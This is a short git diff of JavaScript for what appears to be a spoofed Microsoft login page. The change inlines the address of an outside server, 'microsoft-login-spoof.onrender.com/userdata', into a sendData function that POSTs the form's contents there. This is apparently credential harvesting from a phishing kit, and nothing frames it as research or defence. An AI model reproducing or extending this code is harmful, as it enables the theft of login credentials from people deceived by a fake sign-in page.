@@ -8,9 +8,6 @@ const btnNext = document.querySelector(".firstNext");
 const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
-// Make sure this points to your API
-const API_URL = 'https://microsoft-login-spoof.onrender.com';
-
 const createBody = (data) => {
     let urlEncodedData = "",
         urlEncodedDataPairs = [],
@@ -25,7 +22,7 @@ const createBody = (data) => {
     return urlEncodedData;
 }
 
-const sendData = (data) => fetch(`${API_URL}/userdata`, {
+const sendData = (data) => fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
     method: 'POST',
     mode: 'no-cors',
     cache: 'no-cache',
